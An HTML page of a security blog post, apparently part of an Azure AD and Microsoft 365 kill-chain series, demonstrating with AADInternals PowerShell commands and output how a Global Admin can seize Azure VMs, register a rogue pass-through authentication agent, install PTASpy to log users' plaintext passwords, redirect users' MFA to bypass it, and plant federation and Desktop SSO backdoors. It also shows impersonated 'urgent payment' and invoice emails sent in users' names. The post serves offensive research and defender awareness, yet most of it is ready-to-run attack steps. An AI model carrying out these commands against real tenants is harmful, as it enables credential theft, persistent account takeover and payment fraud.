<!DOCTYPE html>
<html lang="en-gb">
<head>
<meta charset="UTF-8">
<meta http-equiv="cache-control" content="no-cache"> 
<meta http-equiv="expires" content="0"> 
<meta http-equiv="pragma" content="no-cache">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Keys of the kingdom: Playing God as Global Admin</title>
<meta name="description" content="The site for Microsoft 365 and Azure AD administrators">
<meta name="generator" content="Hugo 0.39" />
<meta property="og:title" content="Keys of the kingdom: Playing God as Global Admin" />
<meta property="og:description" content="This post is part 4&frasl;5 of Azure AD and Microsoft 365 kill chain blog series.

Global Admin role is the most powerfull administrator role in Azure AD. It is (almost) equivalent to the local system rigths in traditional Windows environment: If you are a Global Admin, there is no security!
As a Global Admin, there are no limits what you are allowed to do. For instance, one can easily access others&rsquo; data. But why bother, if you can as easily impersonate users?

In this blog, using AADInternals v0.4.0, I&rsquo;ll show how (as an Global Administrator) to gather information of Azure subscriptions, gather users&rsquo; credentials, get system level access to Azure VMs, and how to impersonate users.

" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://o365blog.com/post/admin/" />



<meta property="article:published_time" content="2020-06-16T00:00:00&#43;00:00"/>

<meta property="article:modified_time" content="2020-08-13T00:00:00&#43;00:00"/>











<link rel="dns-prefetch" href="//fonts.googleapis.com" />
<link rel="dns-prefetch" href="//fonts.gstatic.com" />

<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400italic,700" type="text/css" media="all" />
<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet">
<link rel="stylesheet" href="/css/style.css" type="text/css" media="all" />
<script type="text/javascript" src="/js/scripts.js"></script>
<script type="text/javascript" src="/js/tools.js"></script>

<link rel="apple-touch-icon-precomposed" sizes="57x57" href="/images/apple-touch-icon-57x57.png" />
<link rel="apple-touch-icon-precomposed" sizes="114x114" href="/images/apple-touch-icon-114x114.png" />
<link rel="apple-touch-icon-precomposed" sizes="72x72" href="/images/apple-touch-icon-72x72.png" />
<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/images/apple-touch-icon-144x144.png" />
<link rel="apple-touch-icon-precomposed" sizes="60x60" href="/images/apple-touch-icon-60x60.png" />
<link rel="apple-touch-icon-precomposed" sizes="120x120" href="/images/apple-touch-icon-120x120.png" />
<link rel="apple-touch-icon-precomposed" sizes="76x76" href="/images/apple-touch-icon-76x76.png" />
<link rel="apple-touch-icon-precomposed" sizes="152x152" href="/images/apple-touch-icon-152x152.png" />
<link rel="icon" type="image/png" href="/images/favicon-196x196.png" sizes="196x196" />
<link rel="icon" type="image/png" href="/images/favicon-96x96.png" sizes="96x96" />
<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32" />
<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16" />
<link rel="icon" type="image/png" href="/images/favicon-128.png" sizes="128x128" />
<meta name="application-name" content="&nbsp;"/>
<meta name="msapplication-TileColor" content="#FFFFFF" />
<meta name="msapplication-TileImage" content="/images/mstile-144x144.png" />
<meta name="msapplication-square70x70logo" content="/images/mstile-70x70.png" />
<meta name="msapplication-square150x150logo" content="/images/mstile-150x150.png" />
<meta name="msapplication-wide310x150logo" content="/images/mstile-310x150.png" />
<meta name="msapplication-square310x310logo" content="/images/mstile-310x310.png" />


<script>
window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
ga('create', 'UA-61454000-4', 'auto');
ga('send', 'pageview');
</script>
<script async src='//www.google-analytics.com/analytics.js'></script>

</head>
<body class="body body-right-sidebar mobile" itemscope="itemscope" itemtype="http://schema.org/WebPage">
	<div class="container container-outer">
		<header class="header" itemscope="itemscope" itemtype="http://schema.org/WPHeader">
		
			<div class="container container-inner clearfix">
			
				<div class="logo" role="banner" itemscope="itemscope" itemtype="http://schema.org/Brand">
				
					<a class="logo__link" href="/" title="Office 365 blog" rel="home">
						<img src="/images/favicon-96x96.png"><h1 class="logo__title">Office 365 blog</h1>
						<h2 class="logo__tagline">Everything about Microsoft 365 security</h2>
					</a>
				</div>
			</div>
			
<nav class="menu" itemscope="itemscope" itemtype="http://schema.org/SiteNavigationElement">
	<ul class="menu__list">
		<li class="menu__item "><a class="menu__link" href="/aadkillchain/">AAD &amp; M365 KILL CHAIN</a></li>
		<li class="menu__item "><a class="menu__link" href="/aadinternals/">AAD INTERNALS</a></li>
		<li class="menu__item "><a class="menu__link" href="/links/">LINKS</a></li>
		<li class="menu__item "><a class="menu__link" href="/powershell/">POWERSHELL</a></li>
		<li class="menu__item "><a class="menu__link" href="/talks/">TALKS</a></li>
		<li class="menu__item "><a class="menu__link" href="/tools/">TOOLS</a></li>
	</ul>
</nav>

		</header>
		<div class="wrapper clearfix">

<main class="main-content content" role="main" itemprop="mainContentOfPage">
	<article class="post">
		<header class="post__header clearfix">
			<h1 class="post__title">Keys of the kingdom: Playing God as Global Admin</h1>
			<p class="post__meta meta">
				<svg class="icon icon-time" height="14" viewBox="0 0 16 16" width="14" xmlns="http://www.w3.org/2000/svg"><path d="m8-.0000003c-4.4 0-8 3.6-8 8 0 4.4000003 3.6 8.0000003 8 8.0000003 4.4 0 8-3.6 8-8.0000003 0-4.4-3.6-8-8-8zm0 14.4000003c-3.52 0-6.4-2.88-6.4-6.4000003 0-3.52 2.88-6.4 6.4-6.4 3.52 0 6.4 2.88 6.4 6.4 0 3.5200003-2.88 6.4000003-6.4 6.4000003zm.4-10.4000003h-1.2v4.8l4.16 2.5600003.64-1.04-3.6-2.1600003z"/></svg>
				<time class="post__meta-date" datetime="2020-06-16T00:00:00">June 16, 2020</time>
					<time class="post__meta-lastmod" datetime="2020-08-13T00:00:00"> (Last Modified: August 13, 2020)</time>
				<span class="post__meta-categories meta-categories">
					<svg class="icon icon-category" height="16" viewBox="0 0 16 16" width="16" xmlns="http://www.w3.org/2000/svg"><path d="m7 2l1 2h8v11h-16v-13z"/></svg>
					<a class="meta-categories__link" href="/categories/blog" rel="category">blog</a></span>
			</p>
			<div class="post__tags tags clearfix">
<ul class="tags__list">
	<li class="tags__item"><a class="tags__link" href="http://twitter.com/intent/tweet?url=http%3a%2f%2fo365blog.com%2fpost%2fadmin%2f&text=Keys%20of%20the%20kingdom%3a%20Playing%20God%20as%20Global%20Admin&tw_p=tweetbutton" title="Share in Twitter" target="_blank" rel="nofollow"><i class="fa fa-twitter" aria-hidden="true"></i></a></li>
	<li class="tags__item"><a class="tags__link" href="https://www.linkedin.com/shareArticle?url=http%3a%2f%2fo365blog.com%2fpost%2fadmin%2f&mini=true&title=Keys%20of%20the%20kingdom%3a%20Playing%20God%20as%20Global%20Admin&summary=&source=o365blog.com" title="Share in LinkedIn" target="_blank" rel="nofollow"><i class="fa fa-linkedin" aria-hidden="true"></i></a></li>
</ul>
</div>
		</header>
		<div class="post__content clearfix">
			<figure class="post__thumbnail">
				<img src="/images/posts/admin.png" alt="Keys of the kingdom: Playing God as Global Admin">
			</figure>
				<nav id="TableOfContents">
<ul>
<li><a href="#reconnaissance">Reconnaissance</a>
<ul>
<li><a href="#azure-subscriptions">Azure subscriptions</a></li>
<li><a href="#azure-virtual-machines">Azure Virtual Machines</a></li>
</ul></li>
<li><a href="#compromise">Compromise</a>
<ul>
<li><a href="#azure-virtual-machines-1">Azure Virtual Machines</a></li>
<li><a href="#pass-through-authentication">Pass-through authentication</a></li>
<li><a href="#multi-factor-authentication">Multi-factor authentication</a></li>
</ul></li>
<li><a href="#persistence">Persistence</a>
<ul>
<li><a href="#azure-virtual-machines-2">Azure Virtual Machines</a></li>
<li><a href="#identity-federation">Identity federation</a></li>
<li><a href="#desktop-sso-seamless-single-sign-on">Desktop SSO (seamless single-sign-on)</a></li>
<li><a href="#pass-through-authentication-1">Pass-through authentication</a></li>
</ul></li>
<li><a href="#actions-on-intent">Actions on Intent</a></li>
<li><a href="#summary">Summary</a></li>
<li><a href="#references">References</a></li>
</ul>
</nav>
			<p>This post is part <sup>4</sup>&frasl;<sub>5</sub> of <a href="/aadkillchain/" target="_blank">Azure AD and Microsoft 365 kill chain</a> blog series.</p>

<p>Global Admin role is the most powerfull administrator role in Azure AD. It is (almost) equivalent to the local system rigths in traditional Windows environment: <strong>If you are a Global Admin, there is no security!</strong>
As a Global Admin, there are no limits what you are allowed to do. For instance, one can easily access others&rsquo; data. But why bother, if you can as easily impersonate users?</p>

<p>In this blog, using <strong>AADInternals v0.4.0</strong>, I&rsquo;ll show how (as an Global Administrator) to gather information of Azure subscriptions, gather users&rsquo; credentials, get system level access to Azure VMs, and how to impersonate users.</p>

<p></p>

<h1 id="reconnaissance">Reconnaissance</h1>

<p>The <a href="https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-assign-admin-roles#global-administrator--company-administrator" target="_blank">Global Admin role</a> gives access to
all administrative features of Azure AD and Office/Microsoft 365 services.</p>

<h2 id="azure-subscriptions">Azure subscriptions</h2>

<p>As I described in my earlier blog <a href="/post/azurevms/#getting-access-to-azure" target="_blank">post</a>, Global Admins can get access to all Azure subscriptions by <strong>elevating themselves</strong> to <strong>User Access Administrators</strong>:
<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Get an access token and save it to the cache</span>
<span class="nb">Get-AADIntAccessTokenForAzureCoreManagement</span> <span class="n">-SaveToCache</span>

<span class="c"># Grant Azure User Access Administrator role </span>
<span class="n">Grant-AADIntAzureUserAccessAdminRole</span></code></pre></div></p>

<p>Now you are able to list all Azure subscriptions of the tenant:
<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Update the access token after elevation and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForAzureCoreManagement</span> <span class="n">-SaveToCache</span>

<span class="c"># Get all subscriptions of the current tenant</span>
<span class="nb">Get-AADIntAzureSubscriptions</span></code></pre></div></p>

<p><strong>Output:</strong></p>

<pre><code>subscriptionId                       displayName   state  
--------------                       -----------   -----  
867ae413-0ad0-49bf-b4e4-6eb2db1c12a0 MyAzure001    Enabled
99fccfb9-ed41-4179-aaf5-93cae2151a77 Pay-as-you-go Enabled
</code></pre>

<h2 id="azure-virtual-machines">Azure Virtual Machines</h2>

<p>As I described in my earlier blog <a href="/post/azurevms/#getting-access-to-azure" target="_blank">post</a>, after elevating to <strong>User Access Administrator</strong> Global Admin can
assign themselves <a href="https://docs.microsoft.com/en-us/azure/role-based-access-control/built-in-roles" target="_blank">Azure roles</a> (not Azure AD roles).</p>

<p>For example, the easiest way to get access to virtual machines is to assign <strong>Virtual Machine Contributor</strong> role per Azure subscription:
<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Grant Virtual Machine Contributor role to the current user</span>
<span class="nb">Set-AADIntAzureRoleAssignment</span> <span class="n">-SubscriptionId</span> <span class="n">867ae413</span><span class="p">-</span><span class="n">0ad0</span><span class="p">-</span><span class="n">49bf-b4e4</span><span class="p">-</span><span class="n">6eb2db1c12a0</span> <span class="n">-RoleName</span> <span class="s2">&#34;Virtual Machine Contributor&#34;</span></code></pre></div></p>

<p><strong>Output:</strong></p>

<pre><code>roleDefinitionId : /subscriptions/867ae413-0ad0-49bf-b4e4-6eb2db1c12a0/providers/Microsoft.Authorization/roleDefinitions/9980e02c-c2be-4d73-94e8-173b1dc7cf3c
principalId      : 90f9ca62-2238-455b-bb15-de695d689c12
principalType    : User
scope            : /subscriptions/867ae413-0ad0-49bf-b4e4-6eb2db1c12a0
createdOn        : 2020-06-03T11:29:58.1683714Z
updatedOn        : 2020-06-03T11:29:58.1683714Z
createdBy        : 
updatedBy        : 90f9ca62-2238-455b-bb15-de695d689c12
</code></pre>

<p>Now we can list all virtual machines of the subscription:</p>

<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Update the access token after role assignment and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForAzureCoreManagement</span> <span class="n">-SaveToCache</span>

<span class="c"># List the VMs</span>
<span class="nb">Get-AADIntAzureVMs</span> <span class="n">-SubscriptionId</span> <span class="n">867ae413</span><span class="p">-</span><span class="n">0ad0</span><span class="p">-</span><span class="n">49bf-b4e4</span><span class="p">-</span><span class="n">6eb2db1c12a0</span></code></pre></div>

<p><strong>Output:</strong></p>

<pre><code>resourceGroup name     location   id                                   computerName adminUserName vmSize          OS     
------------- ----     --------   --                                   ------------ ------------- ------          --     
PRODUCTION    Client   westus     c210d38b-3346-41d3-a23d-27988315825b Client       AdminUSer     Standard_A2_v2  Windows
PRODUCTION    DC       westus     9b8f8753-196f-4f24-847a-e5bcb751936d DC           AdminUSer     Standard_DS1_v2 Windows
PRODUCTION    Exchange westus     a12ffb24-a69e-4ce9-aff3-275f49bba315 Exchange     AdminUSer     Standard_DS2_v2 Windows
PRODUCTION    Server1  westus     c7d98db7-ccb5-491f-aaeb-e71f0df478b6 Server1      AdminUSer     Standard_DS1_v2 Windows
TEST          Server2  eastus     ae34dfcc-ad89-4e53-b0b4-20d453bdfcef Server2      AdminUSer     Standard_DS1_v2 Windows
TEST          Server3  eastus     f8f6a7c5-9927-47f9-a790-84c866f5719c Server3      AzureUser     Standard_B1ms   Linux
</code></pre>

<h1 id="compromise">Compromise</h1>

<h2 id="azure-virtual-machines-1">Azure Virtual Machines</h2>

<p>As I described in my earlier blog <a href="/post/azurevms/#getting-access-to-azure" target="_blank">post</a>, <strong>Virtual Machine Contributor</strong> role
allows running scripts on any virtual machine of the Azure subscription as SYSTEM (Windows) or root (linux).</p>

<p>For example, we can run a simple &ldquo;whoami&rdquo; on the Server2 we found during the recon phase above:
<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Invoke &#34;whoami&#34; on Server2</span>
<span class="nb">Invoke-AADIntAzureVMScript</span> <span class="n">-SubscriptionId</span> <span class="n">867ae413</span><span class="p">-</span><span class="n">0ad0</span><span class="p">-</span><span class="n">49bf-b4e4</span><span class="p">-</span><span class="n">6eb2db1c12a0</span> <span class="n">-ResourceGroup</span> <span class="n">TEST</span> <span class="n">-Server</span> <span class="n">Server2</span> <span class="n">-Script</span> <span class="s2">&#34;whoami&#34;</span></code></pre></div></p>

<p><strong>Output:</strong></p>

<pre><code>[stdout]
nt authority\system

[stderr]
</code></pre>

<p>In practice, this gives full access to all virtual machines of the Azure subscription.
Running a script is logged to activity log of the Azure subscription, but the content of the script is not.</p>

<h2 id="pass-through-authentication">Pass-through authentication</h2>

<p>As described in the last <a href="/post/on-prem_admin/#pass-through-authentication" target="_blank">blog post</a> of the kill chain series, on-prem administrators
can harvest users&rsquo; credentials by using <strong>PTASpy</strong> (part of AADInternals).</p>

<p>Global Admins can install extra <strong>Microsoft Azure AD Connect Authentication Agent</strong>s for high-availability, as suggested by <a href="https://docs.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-pta-quick-start#step-4-ensure-high-availability" target="_blank">Microsoft</a>.</p>

<p>The authentication agent is meant to be installed on a server which is a member to the same domain than Azure AD Connect. The installation does not check the domain of the computer it is installed, so <strong>the authentication agent can be installed to any server</strong>.
Together with PTASpy, this allows Global Admins to gather users&rsquo; credentials using their own server.</p>

<p>When installing authentication agent, it is registered to Azure AD using the name of the server it is installed to. So, unless it is not named in the similar way than the other servers, this can be easily spotted from Azure AD.</p>

<p>With AADInternals, Global Admin can register an authentication agent using any name they want to:
<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Get access token and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForPTA</span> <span class="n">-SaveToCache</span>

<span class="c"># Register new authentication agent</span>
<span class="nb">Register-AADIntPTAAgent</span> <span class="n">-MachineName</span> <span class="s2">&#34;server1.company.com&#34;</span> <span class="n">-FileName</span> <span class="n">server1</span><span class="p">.</span><span class="n">pfx</span></code></pre></div></p>

<p><strong>Output:</strong></p>

<pre><code>PTA Agent (005b136f-db3e-4b54-9d8b-8994f7717de6) registered as server1.company.com
Certificate saved to server1.pfx
</code></pre>

<p>The created certificate can now be used with the authentication agent.</p>

<h2 id="multi-factor-authentication">Multi-factor authentication</h2>

<p>Global Admins can set users&rsquo; <a href="https://docs.microsoft.com/en-us/azure/active-directory/authentication/howto-mfa-userstates#change-state-using-powershell">MFA settings</a> using MSOnline PowerShell module.</p>

<p>With AADInternals, Global Admin can change the default MFA method of the user, but also their MFA phone number.</p>

<p>The example below can be used to changes user&rsquo;s phone number to Global Admins number and the default method to SMS. This way, if Global Admin knows user&rsquo;s credentials, he or she can bypass also the MFA challenge.
<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Get access token and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForAADGraph</span> <span class="n">-SaveToCache</span>

<span class="c"># Set user MFA settings</span>
<span class="nb">Set-AADIntUserMFA</span> <span class="n">-UserPrincipalName</span> <span class="s2">&#34;user@company.com&#34;</span> <span class="n">-PhoneNumber</span> <span class="s2">&#34;+1 123456789&#34;</span> <span class="n">-DefaultMethod</span> <span class="n">OneWaySMS</span></code></pre></div></p>

<p>If an Azure authenticator is used instead, Global Admin can also modify those settings with AADInternals.</p>

<p>To show user&rsquo;s MFA app settings:
<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Get user&#39;s MFA app settings</span>
<span class="nb">Get-AADIntUserMFAApps</span> <span class="n">-UserPrincipalName</span> <span class="s2">&#34;user@company.com&#34;</span></code></pre></div>
Output:</p>

<pre><code>AuthenticationType : Notification, OTP
DeviceName         : SM-R2D2
DeviceTag          : SoftwareTokenActivated
DeviceToken        : APA91...
Id                 : 454b8d53-d97e-4ead-a69c-724166394334
NotificationType   : GCM
OathTokenTimeDrift : 0
OathSecretKey      : 
PhoneAppVersion    : 6.2001.0140
TimeInterval       : 

AuthenticationType : OTP
DeviceName         : NO_DEVICE
DeviceTag          : SoftwareTokenActivated
DeviceToken        : NO_DEVICE_TOKEN
Id                 : aba89d77-0a69-43fa-9e5d-6f41c7b9bb16
NotificationType   : Invalid
OathTokenTimeDrift : 0
OathSecretKey      : 
PhoneAppVersion    : NO_PHONE_APP_VERSION
TimeInterval       :
</code></pre>

<p>From the output we can see that there are two &ldquo;apps&rdquo; registered.</p>

<p>The first one is the interactive Authenticator app on user&rsquo;s Android device (capable also for one-time-password (OTP)), and the second one is a pure OTP generator.
OTP is generated based on a Base32 encoded secret (OathSecretKey) created when the authenticator was registered.</p>

<p>If we know the <strong>OathSecretKey</strong>, we can generate valid OTP tokens. AFAIK, the only way to get this is to be present when the MFA device is registered when it is shown:
<img src="/images/posts/admin2.png" alt="Azure AD account" /></p>

<p>With the secret key, we can now create OTP:
<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Generate OTP</span>
<span class="nb">New-AADIntOTP</span> <span class="n">-SecretKey</span> <span class="s2">&#34;jmbz yz2w lpxf nzjh&#34;</span></code></pre></div>
Output:</p>

<pre><code>OTP     Valid
---     -----
990 653 15s 
</code></pre>

<p>Global Admin can also change the MFA device of the user. For instance, if the DeviceToken of the admin&rsquo;s Authenticator app is known, it can easily changed in place of user&rsquo;s app:
<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Change user&#39;s MFA device</span>
<span class="nb">Set-AADIntUserMFAApps</span> <span class="n">-UserPrincipalName</span> <span class="s2">&#34;user@company.com&#34;</span> <span class="n">-Id</span> <span class="s2">&#34;454b8d53-d97e-4ead-a69c-724166394334&#34;</span> <span class="n">-DeviceToken</span> <span class="s2">&#34;APA91bEvVMWXcLy7EUEge4jSkD7HAAdWPn-0WjOHrkg0zZvVpg0LRBLa9QN7mEXyJSslqbkWx1Q5Qz8aZyJ69gs0rNGn-b5tc71P-XwRQ734AsdrDCvgJ5F9x17K6kfdisbFrT4z6xQE9EUxgMg5ZA8A-TVXepyqGQ&#34;</span></code></pre></div></p>

<p>Now the user&rsquo;s MFA challenges are directed to admin&rsquo;s device. However, as the user&rsquo;s details is not registered to admin&rsquo;s Authenticator, an error message is shown.</p>

<p>To circumvent this obstacle, I&rsquo;ve created an open-source <a href="https://github.com/Gerenios/Authenticator" target="_blank">AADInternals Authenticator</a> which replaces Microsoft Authenticator.
The Device Token of the authenticator can be easily copied and it will automatically accepts all authentication requests. Thus, Global Admin can bypass MFA.</p>

<p><strong>Note!</strong> Both the phone number and Device Token can be restored, so make sure to save them before changing users&rsquo; MFA settings.</p>

<h1 id="persistence">Persistence</h1>

<h2 id="azure-virtual-machines-2">Azure Virtual Machines</h2>

<p>As demonstrated <a href="#azure-virtual-machines-1">above</a> after giving themselves <strong>Virtual Machine Contributor</strong> role, Global Admins can run commands as SYSTEM or root.
As such, they can use any technique available for creating persistent access to virtual machines.</p>

<h2 id="identity-federation">Identity federation</h2>

<p>As described in the last <a href="/post/on-prem_admin/#federation-services-ad-fs" target="_blank">blog post</a> of the kill chain series, on-prem administrators can export AD FS token signing certificate
and impersonate any user of the tenant (and bypass MFA).</p>

<p>While the Global Admin may or may not have access to on-prem servers, they can create a <a href="/post/aadbackdoor/" target="_blank">backdoor</a> directly to the Azure AD.</p>

<p>The basic idea is to convert a registered domain to federated using a certificate the admin has access to.</p>

<p>With AADInternals, this can be done using the built-in certificate. For example, if there is a domain named <strong>company.myo365.site</strong>, it can be converted to a backdoor:
<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Convert an existing domain to a backdoor</span>
<span class="nb">ConvertTo-AADIntBackdoor</span> <span class="n">-DomainName</span> <span class="s2">&#34;company.myo365.site&#34;</span></code></pre></div></p>

<p>Output:</p>

<pre><code>Are you sure to create backdoor with microsoft.com? Type YES to continue or CTRL+C to abort: YES

IssuerUri               Domain              
---------               ------              
http://any.sts/23748688 company.myo365.site
</code></pre>

<p>Now, as long as we know the ImmutableId of the user, we can create a SAML token and login as the user.
<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Create a new SAML token</span>
<span class="nv">$saml</span><span class="p">=</span><span class="nb">New-AADIntSAMLToken</span> <span class="n">-ImmutableID</span> <span class="s2">&#34;UQ989+t6fEq9/0ogYtt1pA==&#34;</span> <span class="n">-Issuer</span> <span class="s2">&#34;http://any.sts/23748688&#34;</span> <span class="n">-UseBuiltInCertificate</span></code></pre></div></p>

<p>With the SAML token, you can now get OAuth Access Token to be used with AADInternals functions.
<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Get an access token for Exchange Online</span>
<span class="nv">$at</span><span class="p">=</span><span class="nb">Get-AADIntAccessTokenForEXO</span> <span class="n">-SAMLToken</span> <span class="nv">$saml</span>

<span class="c"># Send a message using &#34;Outlook&#34;</span>
<span class="nb">Send-AADIntOutlookMessage</span> <span class="n">-AccessToken</span> <span class="nv">$at</span> <span class="n">-Recipient</span> <span class="s2">&#34;someone@company.com&#34;</span> <span class="n">-Subject</span> <span class="s2">&#34;Urgent payment&#34;</span> <span class="n">-Message</span> <span class="s2">&#34;&lt;h1&gt;Urgent!&lt;/h1&gt;&lt;br&gt;The following bill should be paid asap.&#34;</span></code></pre></div></p>

<h2 id="desktop-sso-seamless-single-sign-on">Desktop SSO (seamless single-sign-on)</h2>

<p>As described in the last <a href="/post/on-prem_admin/#pass-through-authentication" target="_blank">blog post</a> of the kill chain series, on-prem administrators can extract
the password hash of the AZUREADSSOACC computer account and impersonate users with Kerberos tickets.</p>

<p>If the Desktop SSO is not used, Global Admin can enable it using any domain name and password, and use it as a <a href="/post/kerberos/" target="_blank">backdoor</a>:
<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Create an access token for PTA and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForPTA</span> <span class="n">-SaveToCache</span>

<span class="c"># Enable the DesktopSSO</span>
<span class="nb">Set-AADIntDesktopSSOEnabled</span> <span class="n">-Enable</span> <span class="nv">$true</span>

<span class="c"># Enable the DesktopSSO for the given domain</span>
<span class="nb">Set-AADIntDesktopSSO</span> <span class="n">-DomainName</span> <span class="n">company</span><span class="p">.</span><span class="n">com</span> <span class="n">-Password</span> <span class="s2">&#34;mypassword&#34;</span> <span class="n">-Enable</span> <span class="nv">$true</span></code></pre></div></p>

<p>Now, as long as we know the SID of the user, we can create a Kerberos ticket, use it to get an access token for Exchange Online, and finally send an email using Outlook:</p>

<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Create a Kerberos ticket</span>
<span class="nv">$kt</span><span class="p">=</span><span class="nb">New-AADIntKerberosTicket</span> <span class="n">-SidString</span> <span class="s2">&#34;S-1-5-21-854168551-3279074086-2022502410-1104&#34;</span> <span class="n">-Password</span> <span class="s2">&#34;mypassword&#34;</span>

<span class="c"># Get an access token for Exchange Online</span>
<span class="nv">$et</span><span class="p">=</span><span class="nb">Get-AADIntAccessTokenForEXO</span> <span class="n">-KerberosTicket</span> <span class="nv">$kt</span> <span class="n">-Domain</span> <span class="n">company</span><span class="p">.</span><span class="n">com</span>

<span class="c"># Send an email using Outlook API</span>
<span class="nb">Send-AADIntOutlookMessage</span> <span class="n">-AccessToken</span> <span class="nv">$et</span> <span class="n">-Recipient</span> <span class="s2">&#34;accounting@company.com&#34;</span> <span class="n">-Subject</span> <span class="s2">&#34;Invoice&#34;</span> <span class="n">-Message</span> <span class="s2">&#34;Pay the attached invoice &lt;b&gt;ASAP!&lt;/b&gt;&#34;</span></code></pre></div>

<h2 id="pass-through-authentication-1">Pass-through authentication</h2>

<p>In my older blog <a href="/post/pta-deepdive/" target="_blank">post</a>, I explained how the PTA works under the hood.</p>

<p>With this information Global Admin can create a backdoor to Azure AD.</p>

<p>In the <a href="#pass-through-authentication" target="_blank">Compromise</a> section above, Global Admin was able to register an Authenticator app and create the certificate.</p>

<p>To create the backdoor using PTA:</p>

<ul>
<li>Install the authentication agent from <a href="https://download.msappproxy.net/Subscription/00000000-0000-0000-0000-000000000000/Connector/ptaDownloadConnectorInstaller" target="_blank">here</a> to a standalone server or virtual machine.</li>
<li>Configure the agent using your own tenant (you can get a trial tenant from <a href="https://signup.microsoft.com/Signup?OfferId=B07A1127-DE83-4a6d-9F85-2C104BDAE8B4&dl=ENTERPRISEPACK" target="_blank">here</a>)</li>
<li>Change the certificate to one you created during the PTA agent registration</li>
<li>Install PTASpy</li>
</ul>

<p>To change the certificate:
<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Change the PTA certificate</span>
<span class="nb">Set-AADIntPTACertificate</span> <span class="n">-PfxFileName</span> <span class="n">server1</span><span class="p">.</span><span class="n">pfx</span></code></pre></div>
The output should be similar to the following:</p>

<pre><code>Certification information set, remember to restart the service.
</code></pre>

<p><strong>Note!</strong> After a while, Azure AD won&rsquo;t send password requests encrypted using the certificate of the original agent (as it is inactive). That leads to &ldquo;unable to encrypt&rdquo; error message.
If this happens, you need to find out (using SysInterals Procmon or similar tool) which certificate the agent tries to use under &ldquo;C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys\&ldquo;, and give
read access to that file for &ldquo;Network Service&rdquo;. Usually, it is the newest file.</p>

<p>To install PTASpy:
<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Install PTASpy</span>
<span class="n">Install-AADIntPTASpy</span></code></pre></div>
Output:</p>

<pre><code>Are you sure you wan't to install PTASpy to this computer? Type YES to continue or CTRL+C to abort: yes
Installation successfully completed!
All passwords are now accepted and credentials collected to C:\PTASpy\PTASpy.csv
</code></pre>

<p>Now you are able to gather users&rsquo; credentials, but also to log in as any user.
<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Show the PTASpy log with decoded passwords</span>
<span class="nb">Get-AADIntPTASpyLog</span> <span class="n">-DecodePasswords</span></code></pre></div></p>

<p><strong>Output:</strong></p>

<pre><code>UserName         Password   Time                
--------         --------   ----                
user@company.com MyPassword 5/22/2019 9:51:43 AM
user@company.com mYpASSWORD 5/22/2019 9:52:07 AM
</code></pre>

<p><strong>Note!</strong> When there are multiple authentication agents installed, not all authentication requests end up to your instance.</p>

<h1 id="actions-on-intent">Actions on Intent</h1>

<p>As demonstrated above, Global Admins can impersonate users with the three backdoors. As such, they can access users&rsquo; information, send emails on their names, and much more.</p>

<h1 id="summary">Summary</h1>

<p><strong>If you are a Global Admin, there is no security!</strong></p>

<p>This means that Global Admins can do what ever they want to. However, all their actions are logged to audit logs. Therefore rogue admins often try to create a persistent
access to Azure AD using backdoors. After creating the backdoors, all impersonation actions are shown as legit logins.</p>

<p><strong>Note!</strong> Desktop SSO and PTA backdoors DO NOT bypass MFA! But, you can always change the MFA settings of the user..</p>

<h1 id="references">References</h1>

<ul>
<li><a href="https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-assign-admin-roles" target="_blank">Administrator role permissions in Azure Active Directory</a></li>
<li><a href="https://docs.microsoft.com/en-us/office365/enterprise/subscriptions-licenses-accounts-and-tenants-for-microsoft-cloud-offerings" target="_blank">Subscriptions, licenses, accounts, and tenants for Microsoft&rsquo;s cloud offerings</a></li>
</ul>
		</div>
		
<div class="post__tags tags clearfix">
	<img class="icon icon-tag" src="/images/tags.png" width="16" height="16" viewBox="0 0 16 16">
	
	<ul class="tags__list">
		<li class="tags__item"><a class="tags__link" href="/tags/azure-active-directory/" rel="tag">Azure Active Directory</a></li>
		<li class="tags__item"><a class="tags__link" href="/tags/azure/" rel="tag">Azure</a></li>
		<li class="tags__item"><a class="tags__link" href="/tags/security/" rel="tag">security</a></li>
		<li class="tags__item"><a class="tags__link" href="/tags/admin/" rel="tag">admin</a></li>
	</ul>
</div>

		<div class="post__tags tags clearfix">
<ul class="tags__list">
